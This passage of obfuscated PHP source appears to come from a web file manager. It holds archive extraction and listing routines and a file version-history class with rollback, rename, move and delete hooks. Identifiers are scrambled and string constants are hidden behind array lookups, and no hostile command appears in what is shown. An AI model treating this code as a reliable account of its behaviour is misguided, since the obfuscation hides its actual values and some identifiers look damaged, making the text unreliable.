$—çöÛó); if (!IO::exist($ÛÀ•æÛå)) { if ($ŒÉ¡èñ) { del_dir($ŒÉ¡èñ); } show_json(LNG($ö¾©•–•[1180]), !1); } if ($ºû†ÈÊ‘ || !$ŒÉ¡èñ) { if ($ŒÉ¡èñ && strstr($ŒÉ¡èñ, TEMP_FILES)) { $èŒ§Áèï = $—çöÛó = array(); recursion_dir($ÊÉ¤½´ã, $èŒ§Áèï, $—çöÛó, 0); foreach ($èŒ§Áèï as $õêõŸñì) { del_dir($õêõŸñì); } foreach ($—çöÛó as $Š¯³Ù€) { if ($Š¯³Ù€ == $öÂÀÖî) { continue; } del_file($Š¯³Ù€); } } return $ÛÀ•æÛå; } $Ô”š„·ù = self::pathFather($÷Ç–‚â[$ö¾©•–•[94]]); $ƒÛ¿×³ = self::move($ÛÀ•æÛå, $Ô”š„·ù, $ø™åŸ‰Ü); if (!$ƒÛ¿×³) { del_dir($ŒÉ¡èñ); show_json(LNG($ö¾©•–•[1180]), !1); } del_dir($ŒÉ¡èñ); return $ƒÛ¿×³; } public static function unzip($éñá•ì§, $ÆãéÀªİ = "\162\x65\x70\154\141\143\x65") { $îâÍ¤İ‡ =& $_SERVER[¤·²È‰º]; $ìËñş = $éñá•ì§[$îâÍ¤İ‡[94]]; $×É‚–½ = $éñá•ì§[$îâÍ¤İ‡[1181]]; if (!($Ó³Ü§¡Ó = parent::info($ìËñş))) { show_json(LNG($îâÍ¤İ‡[1182]), !1); } if (!($ĞÊêá = parent::infoFull($×É‚–½))) { $×É‚–½ = parent::mkdir($×É‚–½); $ĞÊêá = array($îâÍ¤İ‡[94] => $×É‚–½); } else { if (isset($ĞÊêá[$îâÍ¤İ‡[410]]) && trim($ĞÊêá[$îâÍ¤İ‡[94]], $îâÍ¤İ‡[8]) != trim($×É‚–½, $îâÍ¤İ‡[8])) { $°óÀñ”ü = KodIO::make($ĞÊêá[$îâÍ¤İ‡[440]]); $óÒô…ßÇ = parent::fileNameAuto($°óÀñ”ü, $ĞÊêá[$îâÍ¤İ‡[42]], REPEAT_RENAME_FOLDER, !0); $×É‚–½ = parent::mkdir($°óÀñ”ü . $óÒô…ßÇ); $ĞÊêá = array($îâÍ¤İ‡[94] => $×É‚–½); } } $×É‚–½ = $ĞÊêá[$îâÍ¤İ‡[94]]; $Ç€­©Íˆ = self::tmpFileName($Ó³Ü§¡Ó); $ËèÁ¢™’ = TEMP_FILES . $Ç€­©Íˆ; del_dir($ËèÁ¢™’); mk_dir($ËèÁ¢™’); $¤³í„å€ = self::fileExt($Ó³Ü§¡Ó); $„†ÁÉµ¬ = $ËèÁ¢™’ . $îâÍ¤İ‡[10] . $¤³í„å€; if (!@file_exists(self::iconvSystem($„†ÁÉµ¬))) { $‘ì›ƒ¾Û = self::localFilePath($ìËñş, $¤³í„å€); $„†ÁÉµ¬ = $‘ì›ƒ¾Û ? $‘ì›ƒ¾Û : parent::download($ìËñş, $„†ÁÉµ¬); } $„†ÁÉµ¬ = self::iconvSystem($„†ÁÉµ¬); $Å¥Ğ³Êš = isset($éñá•ì§[$îâÍ¤İ‡[1183]]) ? $éñá•ì§[$îâÍ¤İ‡[1183]] : $îâÍ¤İ‡[1184]; $÷™ïÒ§ = KodArchive::extract($„†ÁÉµ¬, $ËèÁ¢™’ . $îâÍ¤İ‡[8], $Å¥Ğ³Êš); self::archiveExt(); if (!$÷™ïÒ§[$îâÍ¤İ‡[1185]]) { show_json($îâÍ¤İ‡[1186] . $÷™ïÒ§[$îâÍ¤İ‡[1187]], !1); } Hook::trigger($îâÍ¤İ‡[1188], $ËèÁ¢™’); recursion_dir($ËèÁ¢™’, $ÓÂ‘¶›©, $€…ƒÎ²Ù, 0); $¡à¾şğ³ = array_merge($ÓÂ‘¶›©, $€…ƒÎ²Ù); foreach ($¡à¾şğ³ as $ù­ØÍ—) { $ù­ØÍ— = self::iconvApp($ù­ØÍ—); self::move($ù­ØÍ—, $×É‚–½, $ÆãéÀªİ); } del_dir($ËèÁ¢™’); if (!$‘ì›ƒ¾Û) { del_file($„†ÁÉµ¬); } return !0; } public static function unzipList($¸©³Âõ) { $©ã´¤€½ =& $_SERVER[¤·²È‰º]; $ÆËÙº¤ñ = $¸©³Âõ[$©ã´¤€½[94]]; $äéÕ‚¡¤ = isset($¸©³Âõ[$©ã´¤€½[1189]]) ? $¸©³Âõ[$©ã´¤€½[1189]] : -1; $’ªûãĞ³ = 50000; if (request_url_safe($ÆËÙº¤ñ)) { $ØÚ©Ÿ‡Ï = parse_url_query($ÆËÙº¤ñ); if (!isset($ØÚ©Ÿ‡Ï[$©ã´¤€½[94]])) { show_json($©ã´¤€½[1190], !1); } } $€Ÿ‚¸Â¡ = isset($ØÚ©Ÿ‡Ï) ? $ØÚ©Ÿ‡Ï[$©ã´¤€½[94]] : $ÆËÙº¤ñ; $¸ÁáãÂ° = self::info($€Ÿ‚¸Â¡); $Öãı´íæ = self::fileExt($¸ÁáãÂ°); $ÕÓğ™ùÔ = self::tmpFileName($¸ÁáãÂ°); if (isset($ØÚ©Ÿ‡Ï)) { $¤Ëİß = array($ØÚ©Ÿ‡Ï[$©ã´¤€½[94]], $ØÚ©Ÿ‡Ï[$©ã´¤€½[1189]], $ØÚ©Ÿ‡Ï[$©ã´¤€½[42]]); $„†ÚƒŞ© = md5(implode($©ã´¤€½[11], $¤Ëİß)) . $©ã´¤€½[10] . get_path_ext($ØÚ©Ÿ‡Ï[$©ã´¤€½[42]]); } else { $¤Ëİß = array($¸ÁáãÂ°[$©ã´¤€½[42]], $¸ÁáãÂ°[$©ã´¤€½[94]], $¸ÁáãÂ°[$©ã´¤€½[86]]); $„†ÚƒŞ© = md5(implode($©ã´¤€½[11], $¤Ëİß)) . $©ã´¤€½[10] . $Öãı´íæ; } if ($äéÕ‚¡¤ == -1) { $á”éÛ¹ö = IO_PATH_SYSTEM_TEMP . "\172\151\160\126\x69\x65\167\x2f{$ÕÓğ™ùÔ}\x2f{$„†ÚƒŞ©}\x2e\x6c\157\x67"; $‚ùÜëõ¥ = self::infoFull($á”éÛ¹ö); if ($‚ùÜëõ¥) { $á”éÛ¹ö = $‚ùÜëõ¥[$©ã´¤€½[94]]; $ÈµêíÇ = self::getContent($á”éÛ¹ö); if ($ÈµêíÇ) { $œçâ×™Ô = json_decode($ÈµêíÇ, !0); $œçâ×™Ô = is_array($œçâ×™Ô) ? $œçâ×™Ô : array(); if (count($œçâ×™Ô) >= $’ªûãĞ³) { show_json(sprintf(LNG($©ã´¤€½[1191]), count($œçâ×™Ô)), !1); } return $œçâ×™Ô; } } else { $á”éÛ¹ö = self::mkfile($á”éÛ¹ö); } } $Á°Ìß˜ô = TEMP_FILES . $ÕÓğ™ùÔ; if (!is_dir($Á°Ìß˜ô)) { mk_dir($Á°Ìß˜ô); } $ß²° · = $Á°Ìß˜ô . $©ã´¤€½[8] . $„†ÚƒŞ©; if (!@file_exists(self::iconvSystem($ß²° ·))) { if (isset($ØÚ©Ÿ‡Ï)) { url_request($ÆËÙº¤ñ, $©ã´¤€½[1192], $ß²° ·); } else { $°ÏÁ€ÇÚ = self::localFilePath($ÆËÙº¤ñ, $Öãı´íæ); $ß²° · = $°ÏÁ€ÇÚ ? $°ÏÁ€ÇÚ : self::download($ÆËÙº¤ñ, $ß²° ·); } } $ß²° · = self::iconvSystem($ß²° ·); if ($äéÕ‚¡¤ >= 0) { $‡Æú´“İ = isset($¸©³Âõ[$©ã´¤€½[1193]]) ? $¸©³Âõ[$©ã´¤€½[1193]] : !1; $şøÅ¼íÍ = isset($¸©³Âõ[$©ã´¤€½[42]]) ? $¸©³Âõ[$©ã´¤€½[42]] : $©ã´¤€½[12]; KodArchive::filePreview($ß²° ·, $äéÕ‚¡¤, $‡Æú´“İ, $şøÅ¼íÍ); self::archiveExt(); die; } $Ÿ„À«ğ = KodArchive::listContent($ß²° ·); self::archiveExt(); del_dir($Á°Ìß˜ô); if (!$Ÿ„À«ğ[$©ã´¤€½[1185]]) { show_json($Ÿ„À«ğ[$©ã´¤€½[1187]], !1); } $œçâ×™Ô = json_encode($Ÿ„À«ğ[$©ã´¤€½[1187]]); self::setContent($á”éÛ¹ö, $œçâ×™Ô); if (count($Ÿ„À«ğ[$©ã´¤€½[1187]]) >= $’ªûãĞ³) { show_json(sprintf(LNG($©ã´¤€½[1191]), count($Ÿ„À«ğ[$©ã´¤€½[1187]])), !1); } return $Ÿ„À«ğ[$©ã´¤€½[1187]]; } private static function fileExt($ÛÏİ»ËŞ) { $Ÿ’Û™ñ =& $_SERVER[¤·²È‰º]; $ïßåêÙì = $ÛÏİ»ËŞ[$Ÿ’Û™ñ[184]]; if ($ïßåêÙì == $Ÿ’Û™ñ[1194]) { $Ô¸½Ä¿ = $Ÿ’Û™ñ[1195]; if (substr($ÛÏİ»ËŞ[$Ÿ’Û™ñ[42]], -strlen($Ô¸½Ä¿)) == $Ô¸½Ä¿) { $ïßåêÙì = $Ÿ’Û™ñ[1196]; } } self::archiveExt($ïßåêÙì); return $ïßåêÙì; } private static function zipFileList($¢›‰ÙÏ, $£ª×ø­‡ = false) { $¸í‹¥ŒŠ =& $_SERVER[¤·²È‰º]; $Éê…ı¨î = array(); foreach ($¢›‰ÙÏ as $Í½éõ¹ï) { $çî¾µª¸ = $Í½éõ¹ï[$¸í‹¥ŒŠ[94]]; if ($£ª×ø­‡) { $çî¾µª¸ = self::copy($Í½éõ¹ï[$¸í‹¥ŒŠ[94]], $£ª×ø­‡, $¸í‹¥ŒŠ[819]); } else { $‡·úÛ¾ = self::init($Í½éõ¹ï[$¸í‹¥ŒŠ[94]]); if ($‡·úÛ¾->getType() == $¸í‹¥ŒŠ[116]) { $çî¾µª¸ = $‡·úÛ¾->path; } } if ($çî¾µª¸ && self::local()->exist($çî¾µª¸)) { $Éê…ı¨î[$Í½éõ¹ï[$¸í‹¥ŒŠ[94]]] = $çî¾µª¸; } } if (!empty($Éê…ı¨î)) { return array_values($Éê…ı¨î); } show_json(LNG($¸í‹¥ŒŠ[1160]), !1); } public static function tmpFileName($ğ¨‡ôş÷) { $…‡Ô„¡² =& $_SERVER[¤·²È‰º]; $µÇ¤ïÁç = array($ğ¨‡ôş÷[$…‡Ô„¡²[42]], $ğ¨‡ôş÷[$…‡Ô„¡²[94]], $ğ¨‡ôş÷[$…‡Ô„¡²[86]], $ğ¨‡ôş÷[$…‡Ô„¡²[529]]); return md5(implode($…‡Ô„¡²[11], $µÇ¤ïÁç)); } private static function localFilePath($ÙÊœâ„ü, $ÃÛØ”Ôõ) { $È•µÙåë =& $_SERVER[¤·²È‰º]; if ($ÃÛØ”Ôõ == $È•µÙåë[1197] && strtoupper(substr(PHP_OS, 0, 3)) == $È•µÙåë[1198]) { return !1; } $ïõ€âµÎ = KodIO::parse($ÙÊœâ„ü); if ($ïõ€âµÎ[$È•µÙåë[43]] == KodIO::KOD_SOURCE) { $òæ§šı§ = Model($È•µÙåë[826])->fileInfoGet(KodIO::sourceID($ÙÊœâ„ü)); if (!$òæ§šı§[$È•µÙåë[94]]) { show_json($È•µÙåë[1199], !1); } $ÙÊœâ„ü = $òæ§šı§[$È•µÙåë[94]]; } $Ù“Ï¼¤« = self::init($ÙÊœâ„ü); if ($Ù“Ï¼¤«->pathParse[$È•µÙåë[1145]]) { $ÙÊœâ„ü = $Ù“Ï¼¤«->pathParse[$È•µÙåë[1145]]; $Ù“Ï¼¤« = self::init($ÙÊœâ„ü); } $¬ÀÚ¢•ù = $Ù“Ï¼¤«->getType(); if ($¬ÀÚ¢•ù == $È•µÙåë[116] || $¬ÀÚ¢•ù == $È•µÙåë[1200]) { if (!$Ù“Ï¼¤«->exist($Ù“Ï¼¤«->path)) { show_json(LNG($È•µÙåë[115]), !1); } return $Ù“Ï¼¤«->path; } return !1; } private static function archiveExt($’Ë€Ñ = '') { $GLOBALS[$_SERVER[¤·²È‰º][1201]] = $’Ë€Ñ; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ŠêïÊŠ® =& $_SERVER[¤·²È‰º]; $“’”¥æ = $GLOBALS[$ŠêïÊŠ®[6]][$ŠêïÊŠ®[99]]; if ($“’”¥æ[$ŠêïÊŠ®[1202]] != 1) { return; } if ($“’”¥æ[$ŠêïÊŠ®[1203]] <= 0) { return; } if (isset($_REQUEST[$ŠêïÊŠ®[1204]]) && $_REQUEST[$ŠêïÊŠ®[1204]] == $ŠêïÊŠ®[98]) { return; } Hook::bind($ŠêïÊŠ®[1205], $ŠêïÊŠ®[1206]); Hook::bind($ŠêïÊŠ®[1207], $ŠêïÊŠ®[1208]); Hook::bind($ŠêïÊŠ®[1209], $ŠêïÊŠ®[1210]); Hook::bind($ŠêïÊŠ®[1211], $ŠêïÊŠ®[1212]); Hook::bind($ŠêïÊŠ®[1213], $ŠêïÊŠ®[1214]); Hook::bind($ŠêïÊŠ®[1215], $ŠêïÊŠ®[1216]); } public static function eventBeforeUpload($Õ†£Ú¦Õ) { if ($Õ†£Ú¦Õ[3] && $Õ†£Ú¦Õ[3] != REPEAT_REPLACE) { return; } $şÖ±¸ƒÇ = self::parsePath($Õ†£Ú¦Õ[0]); if (!$şÖ±¸ƒÇ) { return; } self::add($şÖ±¸ƒÇ); } public static function eventBeforeEdit($²Õİ‰‹×) { $Ÿ¬ıùŸÌ = self::parsePath($²Õİ‰‹×[0]); if (!$Ÿ¬ıùŸÌ) { return; } self::add($Ÿ¬ıùŸÌ); } public static function eventBeforeCopyFile($¬Ï¾°ñê, $§¨¾ôæ, $ÄŒªËËß, $òñÔ §Ö, $‚¢Ü«åÓ, $ğ´÷êáİ) { $äİ‹ŞÉ =& $_SERVER[¤·²È‰º]; if (isset($ÄŒªËËß->_data[$äİ‹ŞÉ[1149]]) && $ÄŒªËËß->_data[$äİ‹ŞÉ[1149]]) { return; } $ö‘ÒÏ¯õ = $ÄŒªËËß->getPathOuter($òñÔ §Ö); $òˆù‡ñ = self::parsePath($ö‘ÒÏ¯õ); if (!$òˆù‡ñ) { return; } self::add($òˆù‡ñ); } public static function eventBeforeRename($­›‹•ŸÍ) { $ï‰ñº¿Ÿ =& $_SERVER[¤·²È‰º]; $ Ìò¦ = self::parsePath($­›‹•ŸÍ[0]); if (!$ Ìò¦) { return; } $½áºŞÊğ = self::checkInHistory($ Ìò¦); if (!$½áºŞÊğ) { return; } if ($½áºŞÊğ[$ï‰ñº¿Ÿ[43]] == $ï‰ñº¿Ÿ[209]) { $øœ¼Ä‡ˆ = self::listData($ Ìò¦); if ($øœ¼Ä‡ˆ && $øœ¼Ä‡ˆ[$ï‰ñº¿Ÿ[378]]) { self::moveHistory($ Ìò¦, $­›‹•ŸÍ[1]); } } else { IO::rename($½áºŞÊğ[$ï‰ñº¿Ÿ[94]], $­›‹•ŸÍ[1]); } } public static function eventBeforeMove($ˆ½ì¶±Ø) { $èğ¦™×â =& $_SERVER[¤·²È‰º]; $¼í…§¤¬ = self::parsePath($ˆ½ì¶±Ø[0]); if (!$¼í…§¤¬) { return; } $Øšöãø½ = self::parsePath($ˆ½ì¶±Ø[1]); if (!$Øšöãø½) { return; } $´éå¦ô¨ = $ˆ½ì¶±Ø[3]; $ìòøàŒŸ = self::checkInHistory($¼í…§¤¬); if (!$ìòøàŒŸ) { return; } $…‰º¯ñ— = self::pathHistory($Øšöãø½); if ($ìòøàŒŸ[$èğ¦™×â[43]] == $èğ¦™×â[209]) { $‘È›Ÿâ­ = self::listData($¼í…§¤¬); $ïĞÛ ®î = rtrim($Øšöãø½, $èğ¦™×â[8]) . $èğ¦™×â[8] . ($´éå¦ô¨ ? $´éå¦ô¨ : get_path_this($¼í…§¤¬)); $Ê™ğ‹ß = self::listData($ïĞÛ ®î); if ($‘È›Ÿâ­ && $‘È›Ÿâ­[$èğ¦™×â[378]] && $Ê™ğ‹ß && $Ê™ğ‹ß[$èğ¦™×â[378]]) { return self::clear($¼í…§¤¬); } if ($‘È›Ÿâ­ && $‘È›Ÿâ­[$èğ¦™×â[378]]) { self::moveHistory($¼í…§¤¬, $´éå¦ô¨, $…‰º¯ñ—); } } else { IO::move($ìòøàŒŸ[$èğ¦™×â[94]], $…‰º¯ñ—, !1, $´éå¦ô¨); self::clearEmptyFolder(IO::pathFather($ìòøàŒŸ[$èğ¦™×â[94]])); } } public static function eventAfterRemove($ˆÁ¨¤­‡, $ë–ÉÖÃå) { $¸È–Ãù‘ =& $_SERVER[¤·²È‰º]; if (!$ë–ÉÖÃå) { return; } $¹½ùÇÈÆ = self::parsePath($ˆÁ¨¤­‡[0]); if (!$¹½ùÇÈÆ) { return; } $—™Ã˜¤ç = self::checkInHistory($¹½ùÇÈÆ); if (!$—™Ã˜¤ç) { return; } if ($—™Ã˜¤ç[$¸È–Ãù‘[43]] == $¸È–Ãù‘[209]) { $ÙÑñšÈƒ = self::listData($¹½ùÇÈÆ, !1); if ($ÙÑñšÈƒ && $ÙÑñšÈƒ[$¸È–Ãù‘[378]]) { self::clear($¹½ùÇÈÆ, !1); } } else { IO::remove($—™Ã˜¤ç[$¸È–Ãù‘[94]]); self::clearEmptyFolder(IO::pathFather($—™Ã˜¤ç[$¸È–Ãù‘[94]])); } } private static function checkInHistory($ª¸óŸıà) { $Ï‹–¬Ê = self::pathHistory($ª¸óŸıà); if (!IO::exist($Ï‹–¬Ê)) { $Ï‹–¬Ê .= $_SERVER[¤·²È‰º][1217]; } return IO::exist($Ï‹–¬Ê) ? IO::info($Ï‹–¬Ê) : !1; } private static function parsePath($àåçÖ€ö) { $‚¥ô‹¼± =& $_SERVER[¤·²È‰º]; if (!$àåçÖ€ö) { return !1; } if ($GLOBALS[$‚¥ô‹¼±[1218]]) { return; } $¯³ò‡áÆ = KodIO::parse($àåçÖ€ö); $×„Áé¯ˆ = $¯³ò‡áÆ[$‚¥ô‹¼±[43]]; $´•òÊ­Æ = !$×„Áé¯ˆ || $×„Áé¯ˆ == KodIO::KOD_IO || $×„Áé¯ˆ == KodIO::KOD_SHARE_ITEM; if (!$´•òÊ­Æ || !$¯³ò‡áÆ[$‚¥ô‹¼±[1219]]) { return !1; } if (substr($àåçÖ€ö, 0, strlen(DATA_PATH . $‚¥ô‹¼±[1220])) == DATA_PATH . $‚¥ô‹¼±[1220]) { return !1; } if ($×„Áé¯ˆ == KodIO::KOD_SHARE_ITEM) { $ô©à‡Ç¼ = IO::init($àåçÖ€ö); if ($ô©à‡Ç¼->pathParse[$‚¥ô‹¼±[1145]]) { return self::parsePath($ô©à‡Ç¼->pathParse[$‚¥ô‹¼±[1145]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ŒÁ¢ü±® = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $‚¥ô‹¼±[1221]); foreach ($ŒÁ¢ü±® as $¸ÜÇæÕì) { if (!$×„Áé¯ˆ && substr($àåçÖ€ö, 0, strlen($¸ÜÇæÕì)) == $¸ÜÇæÕì) { return !1; } } self::log($GLOBALS[$‚¥ô‹¼±[1140]] . $‚¥ô‹¼±[1222] . $àåçÖ€ö); return $àåçÖ€ö; } private static function pathHistory($‘«ï¼³) { $¨¶ÎËšÂ =& $_SERVER[¤·²È‰º]; $ÂÀ‘•ë = self::$_historyBase . ltrim(KodIO::clear($‘«ï¼³), $¨¶ÎËšÂ[8]); $ÂÀ‘•ë = str_replace(array($¨¶ÎËšÂ[1223]), array($¨¶ÎËšÂ[1224]), $ÂÀ‘•ë); return $ÂÀ‘•ë; } public static function log($ä¢ë î) { } public static function historyCount($ ÊÚêšã) { $°²ì¦ß¼ =& $_SERVER[¤·²È‰º]; $ßôíØØ… = array(); $Š­‰ ¢ = array(); foreach ($ ÊÚêšã as $¡òÍÈ¹ç) { $ªÙ—ïÜç = get_path_father($¡òÍÈ¹ç); if (!$Š­‰ ¢[$ªÙ—ïÜç]) { $Š­‰ ¢[$ªÙ—ïÜç] = array(); } $Š­‰ ¢[$ªÙ—ïÜç][] = get_path_this($¡òÍÈ¹ç); } foreach ($Š­‰ ¢ as $ªÙ—ïÜç => $Ï«‹óƒ¡) { $ÖÌÆÒØ‡ = self::parsePath($ªÙ—ïÜç); if (!$ÖÌÆÒØ‡) { continue; } foreach ($Ï«‹óƒ¡ as $ğàø¯¸À) { $á¥´¼ÖÉ = self::listData(rtrim($ÖÌÆÒØ‡, $°²ì¦ß¼[8]) . $°²ì¦ß¼[8] . $ğàø¯¸À, !1); if ($á¥´¼ÖÉ && $á¥´¼ÖÉ[$°²ì¦ß¼[378]]) { $ßôíØØ…[rtrim($ªÙ—ïÜç, $°²ì¦ß¼[8]) . $°²ì¦ß¼[8] . $ğàø¯¸À] = count($á¥´¼ÖÉ[$°²ì¦ß¼[378]]); } } } return $ßôíØØ…; } public static function add($¹ƒÏ¨è¯) { $Î½Ä¼õ =& $_SERVER[¤·²È‰º]; $îóÚñ = self::listData($¹ƒÏ¨è¯); if (!$îóÚñ) { return; } $í·–Ûôì = Model($Î½Ä¼õ[771])->get($Î½Ä¼õ[1225]); $™ŠïóŒ½ = $GLOBALS[$Î½Ä¼õ[6]][$Î½Ä¼õ[99]][$Î½Ä¼õ[1203]]; $Ü¯ŸËò = $í·–Ûôì == $Î½Ä¼õ[1226] ? min(5, $™ŠïóŒ½) : $™ŠïóŒ½; if ($™ŠïóŒ½ <= 0) { return; } $ÅÊÖšö’ = IO::info($¹ƒÏ¨è¯); $éûˆˆ‰ = $îóÚñ[$Î½Ä¼õ[378]]; if ($ÅÊÖšö’[$Î½Ä¼õ[86]] == 0) { return; } if ($ÅÊÖšö’[$Î½Ä¼õ[86]] >= 1024 * 1024 * 500) { return !1; } $«ëÁé  = IO::hashSimple($¹ƒÏ¨è¯); if ($éûˆˆ‰ && $éûˆˆ‰[0][$Î½Ä¼õ[187]] == $«ëÁé ) { return !0; } if (array_key_exists($Î½Ä¼õ[212], $ÅÊÖšö’) && !$ÅÊÖšö’[$Î½Ä¼õ[212]]) { return !1; } $õ®€úÇÔ = short_id(time()); $Ã´ù††° = array($Î½Ä¼õ[407] => $õ®€úÇÔ, $Î½Ä¼õ[187] => $«ëÁé , $Î½Ä¼õ[42] => $ÅÊÖšö’[$Î½Ä¼õ[42]] . $Î½Ä¼õ[10] . date($Î½Ä¼õ[1227]) . rand_string(1), $Î½Ä¼õ[86] => $ÅÊÖšö’[$Î½Ä¼õ[86]], $Î½Ä¼õ[462] => USER_ID, $Î½Ä¼õ[210] => time(), $Î½Ä¼õ[1228] => $Î½Ä¼õ[12]); IO::mkdir($îóÚñ[$Î½Ä¼õ[1229]]); $Ğşı  = IO::copy($¹ƒÏ¨è¯, $îóÚñ[$Î½Ä¼õ[1229]], !1, $Ã´ù††°[$Î½Ä¼õ[42]]); if (!$Ğşı ) { self::clearEmptyFolder($îóÚñ[$Î½Ä¼õ[1229]]); return !1; } array_unshift($éûˆˆ‰, $Ã´ù††°); if (count($éûˆˆ‰) > $Ü¯ŸËò) { $Ëºêè„û = array_slice($éûˆˆ‰, $Ü¯ŸËò); foreach ($Ëºêè„û as $î€€Œş) { IO::remove($îóÚñ[$Î½Ä¼õ[1229]] . $î€€Œş[$Î½Ä¼õ[42]]); } $éûˆˆ‰ = array_slice($éûˆˆ‰, 0, $Ü¯ŸËò); } return self::saveData($îóÚñ[$Î½Ä¼õ[1230]], $éûˆˆ‰); } public static function remove($éòìŞàÑ, $ŒãÇµÙû) { $ñšŸ‹Ó =& $_SERVER[¤·²È‰º]; $Ã˜Å¾ÏÑ = self::listData($éòìŞàÑ); $ıù¸”òô = array(); if (!$Ã˜Å¾ÏÑ) { return !1; } foreach ($Ã˜Å¾ÏÑ[$ñšŸ‹Ó[378]] as $é–ˆâ) { if ($é–ˆâ[$ñšŸ‹Ó[407]] == $ŒãÇµÙû) { IO::remove($Ã˜Å¾ÏÑ[$ñšŸ‹Ó[1229]] . $é–ˆâ[$ñšŸ‹Ó[42]]); continue; } $ıù¸”òô[] = $é–ˆâ; } return self::saveData($Ã˜Å¾ÏÑ[$ñšŸ‹Ó[1230]], $ıù¸”òô); } public static function clear($ñïïïÕŠ, $íŸÂ¿¬  = true) { $¶£ñ“ =& $_SERVER[¤·²È‰º]; $£«ù‡º– = self::listData($ñïïïÕŠ, $íŸÂ¿¬ ); if (!$£«ù‡º–) { return !1; } foreach ($£«ù‡º–[$¶£ñ“[378]] as $ ıÙÂ†ó) { IO::remove($£«ù‡º–[$¶£ñ“[1229]] . $ ıÙÂ†ó[$¶£ñ“[42]]); } return self::saveData($£«ù‡º–[$¶£ñ“[1230]], array()); } public static function moveHistory($âÑÄ‚Èğ, $œ€ö÷—Î = '', $ãßÏŞ²Ï = '') { $à¬ÏÒ» =& $_SERVER[¤·²È‰º]; $·¢¥‡œ = self::listData($âÑÄ‚Èğ, !1); if (!$·¢¥‡œ || !$·¢¥‡œ[$à¬ÏÒ»[378]]) { return !1; } $‰ÔÑÕ™à = $à¬ÏÒ»[1217]; $œ€ö÷—Î = $œ€ö÷—Î ? $œ€ö÷—Î : get_path_this($âÑÄ‚Èğ); $ãßÏŞ²Ï = $ãßÏŞ²Ï ? $ãßÏŞ²Ï : $·¢¥‡œ[$à¬ÏÒ»[1229]]; $¡Ì™šØ = substr(get_path_this($·¢¥‡œ[$à¬ÏÒ»[1230]]), 0, -strlen($‰ÔÑÕ™à)); foreach ($·¢¥‡œ[$à¬ÏÒ»[378]] as $µ¹µù÷Ò => $Äô÷‡Ä¸) { $‚Ö§´ŞÎ = $œ€ö÷—Î . substr($Äô÷‡Ä¸[$à¬ÏÒ»[42]], strlen($¡Ì™šØ)); $»†¥èî» = IO::move($·¢¥‡œ[$à¬ÏÒ»[1229]] . $Äô÷‡Ä¸[$à¬ÏÒ»[42]], $ãßÏŞ²Ï, !1, $‚Ö§´ŞÎ); if ($»†¥èî») { $·¢¥‡œ[$à¬ÏÒ»[378]][$µ¹µù÷Ò][$à¬ÏÒ»[42]] = $‚Ö§´ŞÎ; } } $·¢¥‡œ[$à¬ÏÒ»[1230]] = IO::move($·¢¥‡œ[$à¬ÏÒ»[1230]], $ãßÏŞ²Ï, !1, $œ€ö÷—Î . $‰ÔÑÕ™à); self::saveData($·¢¥‡œ[$à¬ÏÒ»[1230]], $·¢¥‡œ[$à¬ÏÒ»[378]]); self::clearEmptyFolder($·¢¥‡œ[$à¬ÏÒ»[1229]]); } public static function rollback($şıÂ»Ú, $îÜãâûœ) { $¬òï°Ôó =& $_SERVER[¤·²È‰º]; $ºâËÓºÀ = self::listData($şıÂ»Ú); if (!$ºâËÓºÀ) { return; } $È€Äƒ¨û = IO::info($şıÂ»Ú); foreach ($ºâËÓºÀ[$¬òï°Ôó[378]] as $úåùı« => $•Ò³ÙµÉ) { if ($•Ò³ÙµÉ[$¬òï°Ôó[407]] == $îÜãâûœ) { self::add($şıÂ»Ú); $¶öİåÛÎ = $ºâËÓºÀ[$¬òï°Ôó[1229]] . $•Ò³ÙµÉ[$¬òï°Ôó[42]]; $‘ó¹ö’ = IO::copy($¶öİåÛÎ, IO::pathFather($şıÂ»Ú), REPEAT_REPLACE, $È€Äƒ¨û[$¬òï°Ôó[42]]); if ($‘ó¹ö’) { self::remove($şıÂ»Ú, $îÜãâûœ); } return $‘ó¹ö’; } } return !1; } public static function setDetail($æåßğı, $¡Ïéîİ, $ß¾ëƒ‰ë) { $æÍÂº =& $_SERVER[¤·²È‰º]; $äÙÏóö = self::listData($æåßğı); if (!$äÙÏóö) { return; } foreach ($äÙÏóö[$æÍÂº[378]] as $œÎåûÍ± => $Ï„×‚Ò) { if ($Ï„×‚Ò[$æÍÂº[407]] == $¡Ïéîİ) { $äÙÏóö[$æÍÂº[378]][$œÎåûÍ±][$æÍÂº[1228]] = $ß¾ëƒ‰ë; self::saveData($äÙÏóö[$æÍÂº[1230]], $äÙÏóö[$æÍÂº[378]]); return !0; } } return !1; } public static function fileInfo($ÌïÈ¹È, $Šé“éÏœ) { $ãèçƒ¯è =& $_SERVER[¤·²È‰º]; $»ã §Ôª = self::listData($ÌïÈ¹È); if (!$»ã §Ôª) { show_json(LNG($ãèçƒ¯è[115]), !1); } $„›£¿™÷ = $ãèçƒ¯è[12]; foreach ($»ã §Ôª[$ãèçƒ¯è[378]] as $“İ¨ÑÀ => $®šµĞ˜) { if ($®šµĞ˜[$ãèçƒ¯è[407]] != $Šé“éÏœ) { continue; } $„›£¿™÷ = $»ã §Ôª[$ãèçƒ¯è[1229]] . $®šµĞ˜[$ãèçƒ¯è[42]]; break; } if (!$„›£¿™÷) { show_json(LNG($ãèçƒ¯è[115]), !1); } return IO::info($„›£¿™÷); } public static function fileOut($óí€‰¤, $û¿ü±Ò, $›°ÉØØ´ = false) { $‘ˆü»ç¡ =& $_SERVER[¤·²È‰º]; $ŒüÔùî = self::fileInfo($óí€‰¤, $û¿ü±Ò); $ÚÂèóñÄ =& $GLOBALS[$‘ˆü»ç¡[7]]; $›°ÉØØ´ = isset($ÚÂèóñÄ[$‘ˆü»ç¡[1193]]) && $ÚÂèóñÄ[$‘ˆü»ç¡[1193]] == 1; if (isset($ÚÂèóñÄ[$‘ˆü»ç¡[43]]) && $ÚÂèóñÄ[$‘ˆü»ç¡[43]] == $‘ˆü»ç¡[1231]) { return IO::fileOutImage($ŒüÔùî[$‘ˆü»ç¡[94]], $ÚÂèóñÄ[$‘ˆü»ç¡[1232]]); } IO::fileOut($ŒüÔùî[$‘ˆü»ç¡[94]], $›°ÉØØ´, get_path_this($óí€‰¤)); } public static function listData($ÍÇ„ È´, $éÌÙĞÙ = true) { $ÖƒÅ¶äÃ =& $_SERVER[¤·²È‰º]; if ($éÌÙĞÙ && !IO::exist($ÍÇ„ È´)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if 